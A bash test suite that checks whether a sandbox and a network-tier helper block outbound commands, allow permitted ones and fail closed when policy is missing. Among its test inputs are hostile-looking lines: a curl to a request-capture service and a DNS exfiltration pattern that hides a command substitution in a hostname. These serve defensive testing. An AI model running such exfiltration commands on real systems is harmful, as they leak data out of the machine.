#!/usr/bin/env bash
# SPDX-License-Identifier: MIT
# SPDX-FileCopyrightText: 2025-2026 Marcus Quinn

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)" || exit 1
NETWORK_HELPER="${SCRIPT_DIR}/network-tier-helper.sh"
SANDBOX_HELPER="${SCRIPT_DIR}/sandbox-exec-helper.sh"
TEST_ROOT="$(mktemp -d)"
TEST_HOME="${TEST_ROOT}/home"
TEST_BIN="${TEST_ROOT}/bin"
MARKER="${TEST_ROOT}/executed"
TESTS=0
FAILURES=0
trap 'rm -rf "$TEST_ROOT"' EXIT

mkdir -p "$TEST_HOME" "$TEST_BIN"

pass() {
	local name="$1"
	TESTS=$((TESTS + 1))
	printf 'PASS %s\n' "$name"
	return 0
}

fail() {
	local name="$1"
	local detail="${2:-}"
	TESTS=$((TESTS + 1))
	FAILURES=$((FAILURES + 1))
	printf 'FAIL %s: %s\n' "$name" "$detail"
	return 0
}

reset_marker() {
	rm -f "$MARKER"
	return 0
}

write_fake_network_tools() {
	cat >"${TEST_BIN}/curl" <<EOF
#!/usr/bin/env bash
printf 'curl' >"${MARKER}"
return 0 2>/dev/null || exit 0
EOF
	cat >"${TEST_BIN}/dig" <<EOF
#!/usr/bin/env bash
printf 'dig' >"${MARKER}"
return 0 2>/dev/null || exit 0
EOF
	chmod +x "${TEST_BIN}/curl" "${TEST_BIN}/dig"
	return 0
}

test_network_check_command() {
	if HOME="$TEST_HOME" "$NETWORK_HELPER" check-command "curl https://github.com/aidevops" --worker-id test >/dev/null 2>&1; then
		pass "network check-command allows Tier 1"
	else
		fail "network check-command allows Tier 1"
	fi
	if HOME="$TEST_HOME" "$NETWORK_HELPER" check-command "curl https://requestbin.com/collect" --worker-id test >/dev/null 2>&1; then
		fail "network check-command blocks Tier 5"
	else
		pass "network check-command blocks Tier 5"
	fi
	# Literal command substitution is the payload under test.
	# shellcheck disable=SC2016
	if HOME="$TEST_HOME" "$NETWORK_HELPER" check-command 'dig $(printf data).example.com' --worker-id test >/dev/null 2>&1; then
		fail "network check-command blocks DNS exfiltration shape"
	else
		pass "network check-command blocks DNS exfiltration shape"
	fi
	return 0
}

test_network_policy_fail_closed() {
	local malformed="${TEST_ROOT}/network-tiers.conf"
	printf '[tier5\nrequestbin.com\n' >"$malformed"
	if HOME="$TEST_HOME" AIDEVOPS_NETWORK_TIER_POLICY="${TEST_ROOT}/missing.conf" \
		"$NETWORK_HELPER" check-command "printf safe" >/dev/null 2>&1; then
		fail "missing network policy fails closed"
	else
		pass "missing network policy fails closed"
	fi
	if HOME="$TEST_HOME" AIDEVOPS_NETWORK_TIER_POLICY="$malformed" \
		"$NETWORK_HELPER" check-command "printf safe" >/dev/null 2>&1; then
		fail "malformed network policy fails closed"
	else
		pass "malformed network policy fails closed"
	fi
	return 0
}

test_sandbox_enforcement() {
	local status=0
	reset_marker
	HOME="$TEST_HOME" PATH="${TEST_BIN}:$PATH" "$SANDBOX_HELPER" run curl https://requestbin.com/collect >/dev/null 2>&1 || status=$?
	if [[ "$status" -eq 126 && ! -e "$MARKER" ]]; then
		pass "sandbox blocks Tier 5 before execution"
	else
		fail "sandbox blocks Tier 5 before execution" "status=${status} marker=$([[ -e "$MARKER" ]] && printf yes || printf no)"
	fi

	status=0
	reset_marker
	HOME="$TEST_HOME" PATH="${TEST_BIN}:$PATH" "$SANDBOX_HELPER" run curl https://github.com/aidevops >/dev/null 2>&1 || status=$?
	if [[ "$status" -eq 0 && -e "$MARKER" ]]; then
		pass "sandbox executes allowed network command"
	else
		fail "sandbox executes allowed network command" "status=${status} marker=$([[ -e "$MARKER" ]] && printf yes || printf no)"
	fi

	status=0
	reset_marker
	# Literal command substitution is the payload under test.
	# shellcheck disable=SC2016
	HOME="$TEST_HOME" PATH="${TEST_BIN}:$PATH" "$SANDBOX_HELPER" run dig '$(printf data).example.com' >/dev/null 2>&1 || status=$?
	if [[ "$status" -eq 126 && ! -e "$MARKER" ]]; then
		pass "sandbox blocks DNS exfiltration before execution"
	else
		fail "sandbox blocks DNS exfiltration before execution" "status=${status} marker=$([[ -e "$MARKER" ]] && printf yes || printf no)"
	fi
	return 0
}

test_sandbox_required_policy() {
	local status=0
	local malformed="${TEST_ROOT}/command-policy.json"
	reset_marker
	HOME="$TEST_HOME" PATH="${TEST_BIN}:$PATH" AIDEVOPS_COMMAND_POLICY_HELPER="${TEST_ROOT}/missing.py" \
		"$SANDBOX_HELPER" run curl https://github.com/aidevops >/dev/null 2>&1 || status=$?
	if [[ "$status" -eq 126 && ! -e "$MARKER" ]]; then
		pass "sandbox fails closed when command policy helper is missing"
	else
		fail "sandbox fails closed when command policy helper is missing" "status=${status}"
	fi

	printf '{not-json\n' >"$malformed"
	status=0
	reset_marker
	HOME="$TEST_HOME" PATH="${TEST_BIN}:$PATH" AIDEVOPS_COMMAND_POLICY_CONFIG="$malformed" \
		"$SANDBOX_HELPER" run curl https://github.com/aidevops >/dev/null 2>&1 || status=$?
	if [[ "$status" -eq 126 && ! -e "$MARKER" ]]; then
		pass "sandbox fails closed when command policy is malformed"
	else
		fail "sandbox fails closed when command policy is malformed" "status=${status}"
	fi
	return 0
}

main() {
	write_fake_network_tools
	test_network_check_command
	test_network_policy_fail_closed
	test_sandbox_enforcement
	test_sandbox_required_policy
	printf '\nTests: %d, Failures: %d\n' "$TESTS" "$FAILURES"
	[[ "$FAILURES" -eq 0 ]] || return 1
	return 0
}

main "$@"
